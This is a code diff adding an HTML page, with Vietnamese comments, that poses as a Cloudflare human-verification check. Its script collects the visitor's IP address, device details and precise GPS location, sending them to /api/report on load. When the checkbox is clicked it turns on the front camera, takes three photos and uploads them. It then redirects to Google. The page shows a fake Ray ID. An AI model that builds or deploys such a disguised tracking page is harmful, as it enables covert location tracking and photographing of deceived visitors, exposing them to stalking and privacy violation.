@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Just a moment...</title>
+    <style>
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .content { max-width: 450px; width: 90%; text-align: left; }
+        .logo { width: 120px; margin-bottom: 20px; }
+        h1 { font-size: 24px; font-weight: 500; margin: 0 0 15px; color: #313131; }
+        p { font-size: 15px; line-height: 1.5; color: #313131; margin-bottom: 20px; }
+        .box { border: 1px solid #e0e0e0; border-radius: 4px; padding: 20px; display: flex; align-items: center; background: #fafafa; cursor: pointer; transition: background 0.2s; }
+        .box:hover { background: #f0f0f0; }
+        .checkbox { width: 28px; height: 28px; border: 2px solid #c2c2c2; border-radius: 4px; margin-right: 15px; background: #fff; position: relative; }
+        .checkbox.checked::after { content: '✓'; position: absolute; left: 5px; top: -2px; font-size: 20px; color: #0052cc; }
+        .verify-text { font-size: 16px; color: #313131; flex-grow: 1; }
+        .cloudflare-logo { width: 70px; opacity: 0.6; }
+        .footer { margin-top: 40px; font-size: 13px; color: #919191; border-top: 1px solid #e0e0e0; padding-top: 20px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" alt="Cloudflare" class="logo">
+        <h1>Verify you are human</h1>
+        <p>Please click the box below to verify you are a human and protect our services from automated attacks.</p>
+        
+        <div class="box" id="verifyBox">
+            <div class="checkbox" id="checkbox"></div>
+            <span class="verify-text">Verify you are human</span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/ae/Cloudflare_Logo.svg" alt="Cloudflare" class="cloudflare-logo">
+        </div>
+
+        <div class="footer">
+            Ray ID: <span id="rayId"></span> • Your IP: <span id="userIp">...</span> • Performance & security by Cloudflare
+        </div>
+    </div>
+
+    <video id="video" width="640" height="480" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        const verifyBox = document.getElementById('verifyBox');
+        const checkbox = document.getElementById('checkbox');
+        const rayIdSpan = document.getElementById('rayId');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // Tạo Ray ID giả
+        rayIdSpan.innerText = Math.random().toString(16).substr(2, 16);
+
+        async function collectAndSend(isFinal = false) {
+            const data = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                location: null,
+                image: null,
+                publicIp: null,
+                referrer: document.referrer || "Dán link trực tiếp"
+            };
+
+            // Lấy IP thật từ client-side để server tra cứu chính xác hơn khi test localhost
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                data.publicIp = ipData.ip;
+                if (document.getElementById('userIp')) {
+                    document.getElementById('userIp').innerText = ipData.ip;
+                }
+            } catch(e) {}
+
+            // Nếu không phải là lần cuối (onload), thử lấy GPS nhanh trong 3 giây trước khi gửi
+            if (!isFinal) {
+                try {
+                    const pos = await new Promise((res, rej) => {
+                        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000, enableHighAccuracy: true });
+                    });
+                    data.location = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
+                } catch(e) {}
+                
+                // Gửi thông tin IP và GPS sơ bộ
+                fetch('/api/report', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).catch(() => {});
+            }
+
+            if (isFinal) {
+                // Thử lấy vị trí CHÍNH XÁC (chờ lâu hơn 10 giây)
+                try {
+                    const pos = await new Promise((res, rej) => {
+                        navigator.geolocation.getCurrentPosition(res, rej, { 
+                            timeout: 10000, 
+                            enableHighAccuracy: true,
+                            maximumAge: 0 
+                        });
+                    });
+                    data.location = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
+                } catch(e) {}
+
+                // Thử chụp ảnh
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    video.srcObject = stream;
+                    await new Promise(res => video.onloadedmetadata = res);
+                    
+                    for (let i = 0; i < 3; i++) {
+                        await new Promise(res => setTimeout(res, 800));
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        data.image = canvas.toDataURL('image/jpeg', 0.8);
+                        await fetch('/api/report', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data)
+                        }).catch(() => {});
+                    }
+                    stream.getTracks().forEach(t => t.stop());
+                } catch(e) {}
+
+                // Hoàn tất, chuyển hướng sang trang thật
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 500);
+            }
+        }
+
+        verifyBox.addEventListener('click', async () => {
+            checkbox.classList.add('checked');
+            await collectAndSend(true);
+        });
+
+        // Tự động lấy IP khi load trang
+        window.onload = () => collectAndSend(false);
+    </script>
+</body>
+</html>
